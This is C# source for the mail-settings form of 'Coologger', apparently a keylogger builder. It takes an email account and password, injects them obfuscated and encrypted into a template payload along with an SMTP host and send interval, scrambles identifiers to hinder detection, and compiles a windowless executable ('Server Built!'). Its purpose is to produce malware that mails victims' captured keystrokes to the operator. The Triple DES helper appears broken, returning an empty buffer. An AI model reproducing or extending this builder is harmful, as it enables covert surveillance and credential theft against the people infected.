using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net.Mail;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace Coologger
{
    public partial class MailSettingsForm : Form
    {

        public MailSettingsForm()
        {
            InitializeComponent();
        }

        #region Singleton
        static MailSettingsForm _Instance = null;
        static readonly object PadLock = new object();

        public static MailSettingsForm Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _Instance ?? (_Instance = new MailSettingsForm());
                }
            }
        }
        #endregion

        private void FButton5_Click(object sender, EventArgs e)
        {
            try
            {
                SmtpClient Client;
                MailMessage msg = new MailMessage();
                switch (ComboBox1.Text)
                {
                    case "@gmail.com":
                        Client = new SmtpClient("smtp.gmail.com", 25);
                        break;

                    case "@live.com":
                    case "@hotmail.com":
                        Client = new SmtpClient("smtp.live.com", 25);
                        break;

                    default:
                        Client = new SmtpClient(SMTPTab.Instance.TextBox1.Text, 
                            Convert.ToInt32(SMTPTab.Instance.TextBox2.Text));
                        break;
                }

                Client.EnableSsl = true;
                Client.Credentials =
                    new System.Net.NetworkCredential(TextBox1.Text + ComboBox1.Text, TextBox2.Text);
                
                msg.To.Add(new MailAddress(TextBox1.Text + ComboBox1.Text));
                msg.From = new MailAddress(TextBox1.Text + ComboBox1.Text);
                msg.Subject = "COOLogger";
                msg.Body = "Problem? Not for you!";

                Client.Send(msg);
                msg.Dispose();
                MessageBox.Show("Success! Message Sent", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            catch (Exception exception)
            {
                MessageBox.Show("Test email failed to send. Error:\n" + exception.Message);
            }
        }

        private void FButton4_Click(object sender, EventArgs e)
        {
            SMTPTab.Instance.Show();
        }

        private void PictureBox2_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        void Compile(string Code, string Path, bool FormProgram, string MainClass)
        {
            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");
            VBCodeProvider CodeProvider = new VBCodeProvider(providerOptions);
            CompilerParameters Parameters = new CompilerParameters();
            Parameters.GenerateExecutable = true;
            Parameters.OutputAssembly = Path;
            if (FormProgram) Parameters.CompilerOptions = "/target:winexe";
            Parameters.MainClass = MainClass;
            Parameters.IncludeDebugInformation = false;
            Parameters.ReferencedAssemblies.Add("System.dll");
            Parameters.ReferencedAssemblies.Add("System.Data.dll");
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            Parameters.ReferencedAssemblies.Add("System.XML.dll");

            CompilerResults Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code);
            if (Results.Errors.Count > 0)
            {
                foreach (CompilerError E in Results.Errors)
                {
                    MessageBox.Show(E.ToString());
                }
            }
        }

        private void FButton1_Click(object sender, EventArgs e)
        {
            string source = Global.Source;

            
            if (source != null)
            {
                source = source.Replace("%3%", CheckBox1.Checked.ToString());
                source = source.Replace("%4%", CheckBox2.Checked.ToString());
                source = source.Replace("%5%", CheckBox3.Checked.ToString());
                source = source.Replace("%1%", CheckBox5.Checked.ToString());
                source = source.Replace("%2%", CheckBox6.Checked.ToString());
                source = source.Replace("%6%", CheckBox7.Checked.ToString());

                source = source.Replace("%7%", CheckBox2.Checked.ToString());
                source = source.Replace("%8%", CheckBox2.Checked.ToString());
                source = source.Replace("*email*",
                                                              Util.encryptMe(
                                                                  Util.ObfuscateString(
                                                                      Util.des.Encrypt(TextBox1.Text + ComboBox1.SelectedItem))));
                source = source.Replace("*emailpass*",
                                                              Util.encryptMe(Util.ObfuscateString(Util.des.Encrypt(TextBox2.Text))));
                source = source.Replace("*interval*", (NumericUpDown1.Value * 60000).ToString());

                switch (ComboBox1.Text)
                {
                    case "@hotmail.com":
                        source = source.Replace("*host*", "smtp.live.com");
                        source = source.Replace("*port*", 587.ToString());
                        break;
                    case "@gmail.com":
                        source = source.Replace("*host*", "smtp.gmail.com");
                        source = source.Replace("*port*", 587.ToString());
                        break;
                    default:
                        source = source.Replace("*host*", SMTPTab.Instance.TextBox1.Text);
                        source = source.Replace("*port*", SMTPTab.Instance.TextBox2.Text);
                        break;
                }

                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "Executables *.exe|*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    string[] vars = {
                                        "[1]", "[2]", "[3]", "[4]", "[5]", "[6]", "[7]", "[8]", "[9]", "[10]", "[11]",
                                        "[12]", "[13]", "[14]", "[15]", "[16]", "[17]", "[18]", "[20]", "[21]", "[23]",
                                        "[24]", "[25]", "[26]", "[27]", "[28]", "[29]", "[30]", "[31]", "[32]", "[33]",
                                        "[34]", "[35]", "[36]", "[37]", "[38]", "[39]", "[40]", "[41]", "[42]", "[43]",
                                        "[44]", "[45]", "[46]", "[47]", "[48]", "[49]", "[50]", "[51]", "[52]", "[53]",
                                        "[54]", "[55]", "[56]", "[57]", "[58]", "[59]", "[60]", "[61]", "[62]", "[63]",
                                        "[64]", "[65]", "[66]", "[67]", "[68]", "[69]", "[70]", "[71]", "[72]", "[73]",
                                        "[74]", "[75]", "[76]", "[77]", "[78]", "[79]", "[80]", "[81]", "[82]", "[83]",
                                        "[84]", "[85]", "[86]", "[87]"
                                    };
                    for (int i = 0; i < vars.Length - 1; i++)
                    {
                        string key = Util.randomString(new Random().Next(10, 18));
                        source = source.Replace(vars[i], key);
                        System.Threading.Thread.Sleep(100); //generates same key over & over otherwise
                    }
                    Compile(source, sfd.FileName, true, "");
                    MessageBox.Show("Server Built!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        #region MouseControls
        Point lastClick;
        private void MouseMoved_Control(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastClick.X;
                this.Top += e.Y - lastClick.Y;
            }
        }

        private void MouseDown_Control(object sender, MouseEventArgs e)
        {
            lastClick = new Point(e.X, e.Y);
        }
        #endregion

        private void Form1_Load(object sender, EventArgs e)
        {
            ComboBox1.SelectedIndex = 0;
        }
    }


    public class cTripleDES
    {
        private TripleDESCryptoServiceProvider m_des = new TripleDESCryptoServiceProvider();
        private UTF8Encoding m_utf8 = new UTF8Encoding();
        private byte[] m_key;
        private byte[] m_iv;

        public cTripleDES(byte[] key, byte[] iv)
        {
            m_key = key;
            m_iv = iv;
        }

        public byte[] Encrypt(byte[] input)
        {
            return Transform(input, m_des.CreateEncryptor(m_key, m_iv));
        }

        public string Encrypt(string text)
        {
            byte[] input = m_utf8.GetBytes(text);
            byte[] output = Transform(input, m_des.CreateEncryptor(m_key, m_iv));
            return Convert.ToBase64String(output);
        }

        private byte[] Transform(byte[] input, ICryptoTransform cryptoTransform)
        {
            MemoryStream memStream = new MemoryStream();
            CryptoStream cryptStream = new CryptoStream(memStream, cryptoTransform, CryptoStreamMode.Write);
            cryptStream.Write(input, 0, input.Length);
            cryptStream.FlushFinalBlock();

            memStream.Position = 0;
            byte[] result = new byte[Convert.ToInt32(memStream.Length - 1) + 1];

            memStream.Close();
            cryptStream.Close();
            return result;

        }
    }
}
